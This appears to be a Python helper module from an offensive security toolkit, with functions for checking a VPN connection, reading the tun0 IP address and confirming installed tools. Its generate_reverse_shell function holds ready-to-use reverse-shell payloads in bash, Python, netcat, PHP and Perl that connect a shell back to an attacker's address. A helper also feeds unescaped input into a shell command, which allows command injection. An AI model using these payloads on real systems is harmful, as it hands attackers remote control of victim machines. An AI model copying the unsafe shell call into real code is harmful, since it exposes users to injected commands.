"""Utility functions and helpers"""

import subprocess
from typing import Optional


def run_command(cmd: str, shell: bool = True) -> tuple[int, str, str]:
    """Run a shell command and return (returncode, stdout, stderr)"""
    result = subprocess.run(
        cmd,
        shell=shell,
        capture_output=True,
        text=True
    )
    return result.returncode, result.stdout, result.stderr


def is_vpn_connected() -> bool:
    """Check if VPN is connected"""
    returncode, stdout, _ = run_command("ps aux | grep '[o]penvpn'")
    return bool(stdout.strip())


def get_tun_ip() -> Optional[str]:
    """Get IP address of tun0 interface"""
    returncode, stdout, _ = run_command(
        "ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1"
    )
    if returncode == 0 and stdout.strip():
        return stdout.strip()
    return None


def check_tool_installed(tool: str) -> bool:
    """Check if a tool is installed"""
    returncode, _, _ = run_command(f"which {tool}")
    return returncode == 0


def generate_reverse_shell(ip: str, port: int, shell_type: str = 'bash') -> str:
    """Generate reverse shell payloads"""
    shells = {
        'bash': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        'nc': f"nc -e /bin/sh {ip} {port}",
        'php': f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    }
    return shells.get(shell_type, shells['bash'])
